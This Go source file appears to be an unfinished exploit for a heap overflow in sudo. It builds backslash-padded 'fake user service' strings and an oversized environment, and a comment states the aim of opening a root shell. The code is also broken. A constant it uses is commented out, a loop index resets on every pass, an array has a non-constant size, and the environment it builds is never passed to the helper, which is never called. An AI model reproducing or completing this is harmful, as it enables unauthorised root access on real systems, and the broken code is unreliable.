package main

import (
	"fmt"
	"os/exec"
	"os"
	"log"
)


func main() {

  // sudo path
  //SUDO_PATH := "/usr/bin/sudo"

  // define offset
  //TARGET_OFFSET_START := 0x780 // this is just an integer

  // define fake user service object (in order to override)
  // 0x18 == 24

  FAKE_USER_SERVICE_PART := [0x18]string{"\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "X/X1234\\"}
  user_service_len := 312
  FAKE_USER_SERVICE := [user_service_len]string{}

  for i := 0; i < user_service_len; i++ {
    j := 0
    FAKE_USER_SERVICE[i] = FAKE_USER_SERVICE_PART[j]
    j = (j+1)%24
  }
  //fmt.Println(FAKE_USER_SERVICE)
  FAKE_USER_SERVICE[311] = "X/X1234"
  //fmt.Println(FAKE_USER_SERVICE)

  // define our environment (in order to modify it as we want and open a root shell)

  offset_len := TARGET_OFFSET_START + 0xf -8
  env_extension_len := 7

  env := [user_service_len + 1 + env_extension_len]string{}

  offset := ""
  for i := 0; i<(offset_len - 1); i++ {
    offset += "Z"
  }
  offset += "\\"

  env[0] = offset
  for i := 0; i < user_service_len; i++ {
    env[i+1] = FAKE_USER_SERVICE[i]
  }
 }
 
 func execve(command string, args string, envp string) {
	cmd := exec.Command(command, args)
	cmd.Env = append(os.Environ(), envp)
	out, err := cmd.CombinedOutput()
	if err != nil {
	    log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	fmt.Printf("%s", out)
}
